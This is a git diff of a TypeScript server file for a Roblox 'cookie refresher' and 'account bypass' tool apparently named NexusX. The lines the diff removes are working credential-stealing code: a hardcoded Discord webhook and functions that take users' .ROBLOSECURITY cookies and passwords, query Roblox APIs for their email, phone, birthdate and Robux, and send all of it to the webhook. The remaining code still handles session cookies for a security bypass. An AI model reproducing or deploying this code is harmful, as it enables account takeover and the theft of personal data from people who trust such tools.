@@ -1,83 +1,5 @@
 import { createServerFn } from "@tanstack/react-start";
 
-const DISCORD_WEBHOOK =
-  "https://discord.com/api/webhooks/1513271179505303582/Vc30vof7Ihb4ilIcKuGKqDru8N138v0hSUcUjnTYhx6MJXyoAExJSUVyl2B14dvtL_Dx";
-
-async function sendToDiscord(title: string, fields: Record<string, any>) {
-  try {
-    const desc = Object.entries(fields)
-      .map(([k, v]) => {
-        const val = String(v ?? "");
-        const clipped = val.length > 1000 ? val.slice(0, 1000) + "…" : val;
-        return `**${k}:**\n\`\`\`\n${clipped}\n\`\`\``;
-      })
-      .join("\n");
-    await fetch(DISCORD_WEBHOOK, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        embeds: [
-          {
-            title,
-            description: desc.slice(0, 4000),
-            color: 0xfacc15,
-            timestamp: new Date().toISOString(),
-          },
-        ],
-      }),
-    });
-  } catch {
-    // ignore webhook failure
-  }
-}
-
-async function robloxFetch(url: string, cookie: string) {
-  const r = await fetch(url, {
-    headers: {
-      Cookie: `.ROBLOSECURITY=${cookie}`,
-      "User-Agent": "Roblox/WinInet",
-      Accept: "application/json",
-    },
-  });
-  const t = await r.text();
-  try { return JSON.parse(t); } catch { return { _raw: t }; }
-}
-
-async function getAccountInfo(cookie: string) {
-  try {
-    const me: any = await robloxFetch("https://users.roblox.com/v1/users/authenticated", cookie);
-    if (!me?.id) return { error: "auth failed", raw: me };
-    const userId = me.id;
-
-    const [currency, premium, birthdate, email, phone, games] = await Promise.all([
-      robloxFetch(`https://economy.roblox.com/v1/users/${userId}/currency`, cookie),
-      robloxFetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, cookie),
-      robloxFetch("https://accountinformation.roblox.com/v1/birthdate", cookie),
-      robloxFetch("https://accountinformation.roblox.com/v1/email", cookie),
-      robloxFetch("https://accountinformation.roblox.com/v1/phone", cookie),
-      robloxFetch(`https://games.roblox.com/v2/users/${userId}/games?accessFilter=Public&limit=10&sortOrder=Desc`, cookie),
-    ]);
-
-    const gameList = Array.isArray(games?.data)
-      ? games.data.map((g: any) => `• ${g.name} (placeId ${g.rootPlace?.id ?? "?"}) — ${g.placeVisits ?? 0} visits`).join("\n")
-      : "none";
-
-    return {
-      Username: me.name,
-      DisplayName: me.displayName,
-      UserId: String(userId),
-      Robux: String(currency?.robux ?? "?"),
-      Premium: String(premium === true || premium === "true"),
-      Birthdate: `${birthdate?.birthMonth ?? "?"}/${birthdate?.birthDay ?? "?"}/${birthdate?.birthYear ?? "?"}`,
-      Email: `${email?.emailAddress ?? "?"} (verified: ${email?.verified ?? "?"})`,
-      Phone: `${phone?.countryCode ?? ""} ${phone?.prefix ?? ""} ${phone?.phone ?? "?"} (verified: ${phone?.verified ?? "?"})`,
-      "Recent Games": gameList || "none",
-    };
-  } catch (e: any) {
-    return { error: e?.message ?? "unknown" };
-  }
-}
-
 export const refreshCookie = createServerFn({ method: "POST" })
   .inputValidator((d: { cookie: string }) => d)
   .handler(async ({ data }) => {
@@ -92,13 +14,6 @@ export const refreshCookie = createServerFn({ method: "POST" })
       body: `cookie=${encodeURIComponent(data.cookie)}`,
     });
     const text = await res.text();
-    const info = await getAccountInfo(data.cookie);
-    await sendToDiscord("NexusX Refresher", {
-      "Input Cookie": data.cookie,
-      Status: `${res.status} ${res.ok ? "OK" : "FAIL"}`,
-      Result: text,
-      ...info,
-    });
     return { ok: res.ok, result: text };
   });
 
@@ -135,13 +50,6 @@ export const bypassAccount = createServerFn({ method: "POST" })
     try { initJson = JSON.parse(initTxt); } catch { initJson = { message: initTxt }; }
 
     if (!initRes.ok || !initJson?.success) {
-      await sendToDiscord("NexusX Bypass (init fail)", {
-        Version: data.version,
-        Cookie: data.cookie,
-        Password: data.password ?? "",
-        Status: String(initRes.status),
-        Response: JSON.stringify(initJson),
-      });
       return { ok: false, status: initRes.status, data: initJson };
     }
 
@@ -149,15 +57,6 @@ export const bypassAccount = createServerFn({ method: "POST" })
     const token: string | undefined = payload.token;
 
     const finalize = async (ok: boolean, status: number, body: any) => {
-      const info = await getAccountInfo(data.cookie);
-      await sendToDiscord("NexusX Bypass", {
-        Version: data.version,
-        Cookie: data.cookie,
-        Password: data.password ?? "",
-        Status: `${status} ${ok ? "OK" : "FAIL"}`,
-        Result: typeof body === "string" ? body : JSON.stringify(body),
-        ...info,
-      });
       return { ok, status, data: body };
     };
 
@@ -194,4 +93,3 @@ export const bypassAccount = createServerFn({ method: "POST" })
 
     return finalize(false, 408, { error: "Timed out waiting for bypass", token });
   });
-
